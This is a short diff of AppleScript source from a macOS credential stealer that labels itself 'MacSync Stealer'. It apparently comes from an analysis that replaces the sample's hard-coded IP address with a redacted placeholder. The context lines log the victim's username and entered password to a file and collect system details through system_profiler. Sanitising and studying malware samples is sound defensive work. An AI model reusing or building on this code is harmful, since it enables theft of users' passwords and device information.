@@ -617,7 +617,7 @@ try
 	writeText("MacSync Stealer\n\n", writemind & "info")
 	writeText("Build Tag: s3\n", writemind & "info")
 	writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
-        writeText("IP: 155.133.20.98\n\n", writemind & "info")
+        writeText("IP: [REDACTED_IP]\n\n", writemind & "info")
 	writeText("Username: " & username, writemind & "info")
 	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
 	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
